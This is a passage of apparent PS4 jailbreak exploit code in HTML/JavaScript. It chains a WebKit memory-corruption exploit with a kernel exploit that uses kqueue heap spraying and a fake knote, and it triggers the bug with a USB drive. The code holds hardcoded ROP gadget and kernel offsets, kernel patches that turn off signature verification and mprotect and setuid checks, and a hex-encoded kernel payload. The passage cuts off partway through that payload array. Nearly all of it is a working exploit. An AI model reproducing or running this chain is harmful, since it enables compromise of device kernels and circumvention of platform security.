  return new Promise(resolve => setTimeout(resolve, ms));
}
</script>
<script>
function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.add32 = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32 = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function (val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function (vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function (val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    }

    return this;
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}
</script>
<script>
const stack_sz = 0x40000;
const reserve_upper_stack = 0x10000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
    this.stack = this.stackback.add32(reserve_upper_stack);
    this.stack_array = this.stackback.backing;
    this.retval = this.stackback.add32(stack_sz);
    this.count = 1;
    this.branches_count = 0;
    this.branches_rsps = p.malloc(0x200);

    this.clear = function () {
        this.count = 1;
        this.branches_count = 0;

        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
            this.stack_array[i + stack_reserved_idx] = 0;
        }
    };

    this.pushSymbolic = function () {
        this.count++;
        return this.count - 1;
    }

    this.finalizeSymbolic = function (idx, val) {
        if (val instanceof int64) {
            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
        } else {
            this.stack_array[stack_reserved_idx + idx * 2] = val;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
        }
    }

    this.push = function (val) {
        this.finalizeSymbolic(this.pushSymbolic(), val);
    }

    this.push_write8 = function (where, what) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["pop rsi"]);
        this.push(what);
        this.push(gadgets["mov [rdi], rsi"]);
    }

    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi != undefined) {
            this.push(gadgets["pop rdi"]);
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.push(gadgets["pop rsi"]);
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.push(gadgets["pop rdx"]);
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.push(gadgets["pop rcx"]);
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.push(gadgets["pop r8"]);
            this.push(r8);
        }

        if (r9 != undefined) {
            this.push(gadgets["pop r9"]);
            this.push(r9);
        }

        if (this.stack.add32(this.count * 0x8).low & 0x8) {
            this.push(gadgets["ret"]);
        }

        this.push(rip);
        return this;
    }

    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.retval);
        this.run();
        return p.read8(this.retval);
    }

    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    //get rsp of the next push
    this.get_rsp = function () {
        return this.stack.add32(this.count * 8);
    }
    this.write_result = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], rax"]);
    }
    this.write_result4 = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], eax"]);
    }

    this.jmp_rsp = function (rsp) {
        this.push(window.gadgets["pop rsp"]);
        this.push(rsp);
    }

    this.run = function () {
        p.launch_chain(this);
        this.clear();
    }

    this.KERNEL_BASE_PTR_VAR;
    this.set_kernel_var = function (arg) {
        this.KERNEL_BASE_PTR_VAR = arg;
    }

    this.rax_kernel = function (offset) {
        this.push(gadgets["pop rax"]);
        this.push(this.KERNEL_BASE_PTR_VAR)
        this.push(gadgets["mov rax, [rax]"]);
        this.push(gadgets["pop rsi"]);
        this.push(offset)
        this.push(gadgets["add rax, rsi"]);
    }

    this.write_kernel_addr_to_chain_later = function (offset) {
        this.push(gadgets["pop rdi"]);
        var idx = this.pushSymbolic();
        this.rax_kernel(offset);
        this.push(gadgets["mov [rdi], rax"]);
        return idx;
    }

    this.kwrite8 = function (offset, qword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rsi"]);
        this.push(qword);
        this.push(gadgets["mov [rax], rsi"]);
    }

    this.kwrite4 = function (offset, dword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rdx"]);
        this.push(dword);
        this.push(gadgets["mov [rax], edx"]);
    }

    this.kwrite2 = function (offset, word) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(word);
        this.push(gadgets["mov [rax], cx"]);
    }

    this.kwrite1 = function (offset, byte) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(byte);
        this.push(gadgets["mov [rax], cl"]);
    }

    this.kwrite8_kaddr = function (offset1, offset2) {
        this.rax_kernel(offset2);
        this.push(gadgets["mov rdx, rax"]);
        this.rax_kernel(offset1);
        this.push(gadgets["mov [rax], rdx"]);
    }
    return this;
};
</script>
<script>
var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;

var webKitBase;
var webKitRequirementBase;

var libSceLibcInternalBase;
var libKernelBase;

var textArea = document.createElement("textarea");

const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;

const OFFSET_WKR_psl_builtin = 0x33BA0;

const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;

const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;

const OFFSET_WK2_TLS_IMAGE = 0x38e8020;


const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;

var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {
    "ret": 0x32,
    "pop rdi": 0x319690,
    "pop rsi": 0x1F4D6,
    "pop rdx": 0x986C,
    "pop rcx": 0x657B7,
    "pop r8": 0xAFAA71,
    "pop r9": 0x422571,
    "pop rax": 0x51A12,
    "pop rsp": 0x4E293,

    "mov [rdi], rsi": 0x1A97920,
    "mov [rdi], rax": 0x10788F7,
    "mov [rdi], eax": 0x9964BC,

    "cli ; pop rax": 0x566F8,
    "sti": 0x1FBBCC,

    "mov rax, [rax]": 0x241CC,
    "mov rax, [rsi]": 0x5106A0,
    "mov [rax], rsi": 0x1EFD890,
    "mov [rax], rdx": 0x1426A82,
    "mov [rax], edx": 0x3B7FE4,
    "add rax, rsi": 0x170397E,
    "mov rdx, rax": 0x53F501,
    "add rax, rcx": 0x2FBCD,
    "mov rsp, rdi": 0x2048062,
    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
    "infloop": 0x7DFF,

    "mov [rax], cl": 0xC6EAF,
};

var wkr_gadgetmap = {
    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
};

var wk2_gadgetmap = {
    "mov [rax], rdi": 0xFFDD7,
    "mov [rax], rcx": 0x2C9ECA,
    "mov [rax], cx": 0x15A7D52,
};
var hmd_gadgetmap = {
    "add [r8], r12": 0x2BCE1
};
var ipmi_gadgetmap = {
    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
};

function userland() {

    //RW -> ROP method is strongly based off of:
    //https://github.com/Cryptogenic/PS4-6.20-WebKit-Code-Execution-Exploit

    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;

    //pointer to vtable address
    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    var textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate webkitbase
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

    webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
    webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);

    for (var gadget in wk_gadgetmap) {
        window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (var gadget in wkr_gadgetmap) {
        window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
    }

    function get_jmptgt(address) {
        var instr = p.read4(address) & 0xFFFF;
        var offset = p.read4(address.add32(2));
        if (instr != 0x25FF) {
            return 0;
        }
        return address.add32(0x6 + offset);
    }

    function malloc(sz) {
        var backing = new Uint8Array(0x10000 + sz);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc32(sz) {
        var backing = new Uint8Array(0x10000 + sz * 4);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing.buffer);
        return ptr;
    }

    function array_from_address(addr, size) {
        var og_array = new Uint32Array(0x1000);
        var og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        var bufView = new Uint8Array(str.length + 1);
        for (var i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    }

    function readstr(addr) {
        var str = "";
        for (var i = 0;; i++) {
            var c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    var fakeVtable_setjmp = p.malloc32(0x200);
    var fakeVtable_longjmp = p.malloc32(0x200);
    var original_context = p.malloc32(0x40);
    var modified_context = p.malloc32(0x40);

    p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
    p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
    p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
    p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    function launch_chain(chain) {
        chain.push(window.gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

        p.write8(textAreaVtPtr, fakeVtable_setjmp);
        textArea.scrollLeft = 0x0;
        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
        p.write8(modified_context.add32(0x10), chain.stack);
        p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

        p.write8(textAreaVtPtr, fakeVtable_longjmp);
        textArea.scrollLeft = 0x0;
        p.write8(textAreaVtPtr, textAreaVtable);
    }

    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);

    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);
    var countbytes;

    for (var i = 0; i < 0x40000; i++) {
        if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i = 0; i < countbytes; i++) {
        if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
            dview8[0] = kview[i + 3];
            dview8[1] = kview[i + 4];
            dview8[2] = kview[i + 5];
            dview8[3] = kview[i + 6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    p.write8(kstr, orig_kview_buf);

    chain = new rop();

    //Sanity check
    if (chain.syscall(20).low == 0) {
        alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");
        while (1);
    }
}


function run_hax() {
    userland();
    if (chain.syscall(23, 0).low != 0x0) {
       kernel();
       //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
    }
    else
    {
       showMessage("Loading Payload...");
       setTimeout(injectPayload, 3000);
    }
}


function kernel() {
    extra_gadgets();
    kchain_setup();
    object_setup();
    trigger_spray();
}

var handle;
var random_path;
var ex_info;

function load_prx(name) {
    //sys_dynlib_load_prx
    var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
    if (res.low != 0x0) {
        alert("failed to load prx/get handle " + name);
    }
    //sys_dynlib_get_info_ex
    p.write8(ex_info, 0x1A8);
    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
    if (res.low != 0x0) {
        alert("failed to get module info from handle");
    }
    var tlsinit = p.read8(ex_info.add32(0x110));
    var tlssize = p.read4(ex_info.add32(0x11C));

    if (tlssize != 0) {
        if (name == "libSceWebKit2.sprx") {
            tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
        } else {
            alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
        }
    }
    return tlsinit;
}

//Obtain extra gadgets through module loading
function extra_gadgets() {
    handle = p.malloc(0x1E8);
    var randomized_path_length_ptr = handle.add32(0x4);
    var randomized_path_ptr = handle.add32(0x14);
    ex_info = randomized_path_ptr.add32(0x40);

    p.write8(randomized_path_length_ptr, 0x2C);
    chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
    random_path = p.readstr(randomized_path_ptr);

    var ipmi_addr = load_prx("libSceIpmi.sprx");
    var hmd_addr = load_prx("libSceHmd.sprx");
    var wk2_addr = load_prx("libSceWebKit2.sprx");

    for (var gadget in hmd_gadgetmap) {
        window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
    }
    for (var gadget in wk2_gadgetmap) {
        window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
    }
    for (var gadget in ipmi_gadgetmap) {
        window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
    }

    for (var gadget in window.gadgets) {
        p.read8(window.gadgets[gadget]);
        //Ensure all gadgets are available to kernel.
        chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
    }
    chain.run();
}

//Build the kernel rop chain, this is what the kernel will be executing when the fake obj pivots the stack.
function kchain_setup() {
    const KERNEL_busy = 0x1B28DF8;

    const KERNEL_bcopy = 0xACD;
    const KERNEL_bzero = 0x2713FD;
    const KERNEL_pagezero = 0x271441;
    const KERNEL_memcpy = 0x2714BD;
    const KERNEL_pagecopy = 0x271501;
    const KERNEL_copyin = 0x2716AD;
    const KERNEL_copyinstr = 0x271B5D;
    const KERNEL_copystr = 0x271C2D;
    const KERNEL_setidt = 0x312c40;
    const KERNEL_setcr0 = 0x1FB949;
    const KERNEL_Xill = 0x17d500;
    const KERNEL_veriPatch = 0x626874;
    const KERNEL_enable_syscalls_1 = 0x490;
    const KERNEL_enable_syscalls_2 = 0x4B5;
    const KERNEL_enable_syscalls_3 = 0x4B9;
    const KERNEL_enable_syscalls_4 = 0x4C2;
    const KERNEL_mprotect = 0x80B8D;
    const KERNEL_prx = 0x23AEC4;
    const KERNEL_dlsym_1 = 0x23B67F;
    const KERNEL_dlsym_2 = 0x221b40;
    const KERNEL_setuid = 0x1A06;
    const KERNEL_syscall11_1 = 0x1100520;
    const KERNEL_syscall11_2 = 0x1100528;
    const KERNEL_syscall11_3 = 0x110054C;
    const KERNEL_syscall11_gadget = 0x4c7ad;
    const KERNEL_mmap_1 = 0x16632A;
    const KERNEL_mmap_2 = 0x16632D;
    const KERNEL_setcr0_patch = 0x3ade3B;
    const KERNEL_kqueue_close_epi = 0x398991;

    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
    //negative offset of kqueue string to kernel base
    //0xFFFFFFFFFF86B593 0x505
    //0xFFFFFFFFFF80E364 0x900
    p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));

    kchain = new rop();
    kchain2 = new rop();
    //Ensure the krop stack remains available.
    {
        chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
        chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
        chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
    }
    chain.run();

    kchain.count = 0;
    kchain2.count = 0;

    kchain.set_kernel_var(KERNEL_BASE_PTR);
    kchain2.set_kernel_var(KERNEL_BASE_PTR);

    kchain.push(gadgets["pop rax"]);
    kchain.push(SAVED_KERNEL_STACK_PTR);
    kchain.push(gadgets["mov [rax], rdi"]);
    kchain.push(gadgets["pop r8"]);
    kchain.push(KERNEL_BASE_PTR);
    kchain.push(gadgets["add [r8], r12"]);

    //Sorry we're closed
    kchain.kwrite1(KERNEL_busy, 0x1);
    kchain.push(gadgets["sti"]); //it should be safe to re-enable interrupts now.


    var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
    var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
    //Modify UD
    kchain.push(gadgets["pop rdi"]);
    kchain.push(0x6);
    kchain.push(gadgets["pop rsi"]);
    kchain.push(gadgets["mov rsp, rdi"]);
    kchain.push(gadgets["pop rdx"]);
    kchain.push(0xE);
    kchain.push(gadgets["pop rcx"]);
    kchain.push(0x0);
    kchain.push(gadgets["pop r8"]);
    kchain.push(0x0);
    var idx1_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setidt

    kchain.push(gadgets["pop rsi"]);
    kchain.push(0x80040033);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(kchain2.stack);
    var idx2_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setcr0

    kchain.finalizeSymbolic(idx1, idx1_dest);
    kchain.finalizeSymbolic(idx2, idx2_dest);


    //Initial patch(es)
    kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
    kchain2.kwrite1(KERNEL_bcopy, 0xEB);
    //might as well do the others
    kchain2.kwrite1(KERNEL_bzero, 0xEB);
    kchain2.kwrite1(KERNEL_pagezero, 0xEB);
    kchain2.kwrite1(KERNEL_memcpy, 0xEB);
    kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
    kchain2.kwrite1(KERNEL_copyin, 0xEB);
    kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
    kchain2.kwrite1(KERNEL_copystr, 0xEB);

    //I guess you're not all that bad...
    kchain2.kwrite1(KERNEL_busy, 0x0); //it should now be safe to handle timer-y interrupts again

    //Restore original UD
    var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
    var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x6);
    kchain2.push(gadgets["pop rsi"]);
    var idx3_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
    kchain2.push(gadgets["pop rdx"]);
    kchain2.push(0xE);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x0);
    kchain2.push(gadgets["pop r8"]);
    kchain2.push(0x0);
    var idx4_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 

    kchain2.finalizeSymbolic(idx3, idx3_dest);
    kchain2.finalizeSymbolic(idx4, idx4_dest);

    //Apply kernel patches    
    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
    //patch in reverse because /shrug
    kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
    kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
    kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);

    kchain2.kwrite1(KERNEL_setuid, 0xEB);
    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
    kchain2.kwrite2(KERNEL_prx, 0xE990);
    kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
    kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);

    kchain2.kwrite1(KERNEL_mmap_1, 0x37);
    kchain2.kwrite1(KERNEL_mmap_2, 0x37);

    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);

    //Restore CR0
    kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
    var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x80050033);
    var idx5_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
    kchain2.finalizeSymbolic(idx5, idx5_dest);

    //Recover
    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
    kchain2.push(gadgets["mov rdx, rax"]);
    kchain2.push(gadgets["pop rsi"]);
    kchain2.push(SAVED_KERNEL_STACK_PTR);
    kchain2.push(gadgets["mov rax, [rsi]"]);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x10);
    kchain2.push(gadgets["add rax, rcx"]);
    kchain2.push(gadgets["mov [rax], rdx"]);
    kchain2.push(gadgets["pop rdi"]);
    var idx6 = kchain2.pushSymbolic();
    kchain2.push(gadgets["mov [rdi], rax"]);
    kchain2.push(gadgets["sti"]);
    kchain2.push(gadgets["pop rsp"]);
    var idx6_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with old stack pointer
    kchain2.finalizeSymbolic(idx6, idx6_dest);
}

function object_setup() {
    //Map fake object
    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
    var fake_filtops = fake_knote.add32(0x4000);
    var fake_obj = fake_knote.add32(0x8000);
    if (fake_knote.low != 0x4000) {
        alert("enomem: " + fake_knote);
        while (1);
    }
    //setup fake object
    //KNOTE
    {
        p.write8(fake_knote, fake_obj);
        p.write8(fake_knote.add32(0x68), fake_filtops)
    }
    //FILTOPS
    {
        p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
        p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
        p.write8(fake_filtops.add32(0x8), kchain.stack);
        p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
    }
    //OBJ
    {
        p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
    }
    //Ensure the fake knote remains available
    chain.syscall(203, fake_knote, 0xC000);
}

var trigger_spray = function () {

    var NUM_KQUEUES = 0x1B0;
    var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
    //Make kqueues
    {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[362]);
            chain.write_result4(kqueue_ptr.add32(0x4 * i));
        }
    }
    chain.run();
    var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);

    var that_one_socket = chain.syscall(97, 2, 1, 0);
    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
        alert("invalid socket");
        while (1);
    }

    //Spray kevents
    var kevent = p.malloc(0x20);
    p.write8(kevent.add32(0x0), that_one_socket);
    p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
    p.write4(kevent.add32(0xC), 0x0);
    p.write8(kevent.add32(0x10), 0x0);
    p.write8(kevent.add32(0x18), 0x0);
    //
    {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
        }
    }
    chain.run();

    //Fragment memory
    {
        for (var i = 18; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
    }
    chain.run();

    //Trigger OOB

    alert("Insert The USB Drive And Click OK When You See The Popup Notification");
    showMessage("Loading ExFatHax...");


    sleep(3000).then(() => {
   
        //Trigger corrupt knote
        {
        for (var i = 1; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
        }
        chain.run();

        if (chain.syscall(23, 0).low == 0) {
			
            //cleanup fake knote & release locked gadgets/stack.
            chain.fcall(window.syscalls[73], 0x4000, 0xC000);
            chain.fcall(window.syscalls[325]);
            chain.run();
			
            //This disables sysveri, see https://github.com/ChendoChap/pOOBs4/blob/main/patch.s for more info
            var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
            var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
            var PatchPl = [0x00000BB8,0xFE894800,0x033D8D48,0x0F000000,0x4855C305,0x8B48E589,0x95E8087E,0xE8000000,0x00000175,0x033615FF,0x8B480000,0x0003373D,0x3F8B4800,0x74FF8548,0x3D8D48EB,0x0000029D,0xF9358B48,0x48000002,0x0322158B,0x8B480000,0x00D6E812,0x8D480000,0x00029F3D,0x358B4800,0x000002E4,0x05158B48,0x48000003,0xB9E8128B,0x48000000,0x02633D8D,0x8B480000,0x0002BF35,0x158B4800,0x000002C8,0xE8128B48,0x0000009C,0x7A3D8D48,0x48000002,0x02AA358B,0x8B480000,0x0002AB15,0x128B4800,0x00007FE8,0x0185E800,0xC35D0000,0x6D3D8948,0x48000002,0x026E3D01,0x01480000,0x00026F3D,0x3D014800,0x00000270,0x713D0148,0x48000002,0x02723D01,0x01480000,0x0002933D,0x3D014800,0x00000294,0x653D0148,0x48000002,0x02663D01,0x01480000,0x0002873D,0x3D014800,0x00000288,0x893D0148,0x48000002,0x028A3D01,0x01480000,0x00028B3D,0x3D014800,0x0000024C,0x3D3D0148,0xC3000002,0xE5894855,0x10EC8348,0x24348948,0x24548948,0xED15FF08,0x48000001,0x4B74C085,0x48C28948,0x4840408B,0x2F74C085,0x28788B48,0x243C3B48,0x8B480A74,0xC0854800,0xECEB1D74,0x18788B48,0x74FF8548,0x7F8B48ED,0x7C3B4810,0xE2750824,0xFF1040C7,0x48FFFFFF,0x31107A8D,0x31D231F6,0xA515FFC9,0x4800